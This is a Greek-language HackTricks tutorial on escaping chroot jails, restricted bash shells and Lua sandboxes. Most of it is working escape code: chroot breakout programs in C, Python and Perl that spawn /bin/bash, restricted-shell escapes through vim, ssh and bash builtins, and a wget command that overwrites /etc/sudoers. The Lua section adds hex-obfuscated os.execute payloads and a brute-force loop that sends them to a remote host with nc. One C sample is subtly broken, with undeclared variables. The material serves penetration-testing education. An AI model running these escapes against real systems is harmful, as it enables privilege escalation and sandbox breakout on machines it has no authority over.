# Απόδραση από Φυλακές

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **GTFOBins**

**Αναζητήστε στο** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **αν μπορείτε να εκτελέσετε οποιοδήποτε δυαδικό με ιδιότητα "Shell"**

## Απόδραση από Chroot

Από [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Ο μηχανισμός chroot **δεν προορίζεται να προστατεύσει** από εσκεμμένη παρεμβολή από **προνομιούχους** (**root**) **χρήστες**. Σε περισσότερα συστήματα, τα περιβάλλοντα chroot δεν στοιβάζονται σωστά και τα προγράμματα που έχουν τεθεί σε chroot **με επαρκή δικαιώματα μπορεί να εκτελέσουν ένα δεύτερο chroot για να ξεφύγουν**.\
Συνήθως αυτό σημαίνει ότι για να αποδράσετε πρέπει να είστε root μέσα στο chroot.

{% hint style="success" %}
Το **εργαλείο** [**chw00t**](https://github.com/earthquake/chw00t) δημιουργήθηκε για να καταχραστεί τα παρακάτω σενάρια και να ξεφύγει από το `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Αν είστε **root** μέσα σε ένα chroot μπορείτε να **ξεφύγετε** δημιουργώντας **ένα άλλο chroot**. Αυτό συμβαίνει επειδή δύο chroots δεν μπορούν να υπάρχουν ταυτόχρονα (στο Linux), οπότε αν δημιουργήσετε ένα φάκελο και στη συνέχεια **δημιουργήσετε ένα νέο chroot** σε αυτόν τον νέο φάκελο ενώ **είστε έξω από αυτόν**, τώρα θα βρίσκεστε **έξω από το νέο chroot** και συνεπώς θα βρίσκεστε στο FS.

Αυτό συμβαίνει επειδή συνήθως το chroot ΔΕΝ μετακινεί τον τρέχοντα κατάλογο εργασίας στον καθορισμένο, οπότε μπορείτε να δημιουργήσετε ένα chroot αλλά να είστε έξω από αυτόν.
{% endhint %}

Συνήθως δεν θα βρείτε το δυαδικό `chroot` μέσα σε μια φυλακή chroot, αλλά **μπορείτε να το μεταγλωττίσετε, να το ανεβάσετε και να το εκτελέσετε**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Πυθον</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Αποθηκευμένο fd

{% hint style="warning" %}
Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτή την περίπτωση ο **εισβολέας αποθηκεύει έναν αριθμό αρχείου στον τρέχοντα κατάλογο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τελικά, καθώς έχει **πρόσβαση** σε αυτόν τον **FD** **έξω** από το chroot, μπορεί να τον χρησιμοποιήσει και να **δραπετεύσει**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Το FD μπορεί να περάσει μέσω Unix Domain Sockets, οπότε:

* Δημιούργησε ένα παιδί διεργασία (fork)
* Δημιούργησε UDS ώστε ο γονέας και το παιδί να μπορούν να επικοινωνούν
* Εκτέλεσε chroot στη διεργασία παιδιού σε διαφορετικό φάκελο
* Στη διεργασία γονέα, δημιούργησε ένα FD ενός φακέλου που βρίσκεται έξω από το chroot της νέας διεργασίας παιδιού
* Πέρασε στη διεργασία παιδί αυτό το FD χρησιμοποιώντας το UDS
* Η διεργασία παιδί αλλάζει τον τρέχοντα κατάλογο σε αυτό το FD και επειδή βρίσκεται έξω από το chroot της, θα δραπετεύσει από τη φυλακή
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Τοποθέτηση της ρίζας της συσκευής (/) σε έναν κατάλογο μέσα στο chroot
* Εκτέλεση chroot σε αυτόν τον κατάλογο

Αυτό είναι δυνατό στο Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Τοποθέτηση του procfs σε έναν κατάλογο μέσα στο chroot (αν δεν υπάρχει ακόμα)
* Αναζήτηση ενός pid που έχει διαφορετική καταχώριση ρίζας/cwd, όπως: /proc/1/root
* Εκτέλεση chroot σε αυτήν την καταχώριση
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Δημιουργία ενός Fork (διεργασία παιδί) και chroot σε έναν διαφορετικό φάκελο βαθύτερα στο FS και CD σε αυτόν
* Από τη διεργασία γονέα, μετακίνησε τον φάκελο όπου βρίσκεται η διεργασία παιδί σε έναν φάκελο πριν το chroot των παιδιών
* Αυτή η διεργασία παιδί θα βρει τον εαυτό της έξω από το chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Παλιότερα, οι χρήστες μπορούσαν να εντοπίζουν σφάλματα στις δικές τους διεργασίες από μια διεργασία του ίδιου... αλλά αυτό δεν είναι πλέον δυνατό από προεπιλογή
* Παρόλα αυτά, αν είναι δυνατό, μπορείτε να χρησιμοποιήσετε το ptrace σε μια διεργασία και να εκτελέσετε ένα shellcode μέσα σε αυτήν ([δείτε αυτό το παράδειγμα](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Λήψη πληροφοριών σχετικά με τη φυλακή:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Τροποποίηση του PATH

Ελέγξτε εάν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρησιμοποιώντας το vim
```bash
:set shell=/bin/sh
:shell
```
### Δημιουργία σεναρίου

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με περιεχόμενο _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Αποκτήστε το bash από το SSH

Εάν έχετε πρόσβαση μέσω ssh, μπορείτε να χρησιμοποιήσετε αυτό το κόλπο για να εκτελέσετε ένα κέλυφος bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Δήλωση
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να αντικαταστήσετε για παράδειγμα το αρχείο sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Άλλα κόλπα

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Ενδιαφέρουσα μπορεί να είναι επίσης η σελίδα:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Κόλπα σχετικά με την απόδραση από τα Python jails στην ακόλουθη σελίδα:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Σε αυτήν τη σελίδα μπορείτε να βρείτε τις γενικές λειτουργίες στις οποίες έχετε πρόσβαση μέσα στο Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Αξιολόγηση με εκτέλεση εντολής:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Μερικά κόλπα για **να καλέσετε συναρτήσεις ενός βιβλιοθήκης χωρίς να χρησιμοποιήσετε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Απαριθμήστε τις λειτουργίες ενός βιβλιοθήκης:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημειώστε ότι κάθε φορά που εκτελείτε την προηγούμενη μιας γραμμής εντολή σε ένα **διαφορετικό περιβάλλον lua η σειρά των λειτουργιών αλλάζει**. Επομένως, αν χρειάζεστε να εκτελέσετε μια συγκεκριμένη λειτουργία, μπορείτε να πραγματοποιήσετε μια επίθεση βίας φορτώνοντας διαφορετικά περιβάλλοντα lua και καλώντας την πρώτη λειτουργία της βιβλιοθήκης:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Λάβετε διαδραστικό κέλυφος lua**: Εάν βρίσκεστε μέσα σε ένα περιορισμένο κέλυφος lua, μπορείτε να λάβετε ένα νέο κέλυφος lua (και ελπίζουμε απεριόριστο) καλώντας:
```bash
debug.debug()
```
## Αναφορές

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Διαφάνειες: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
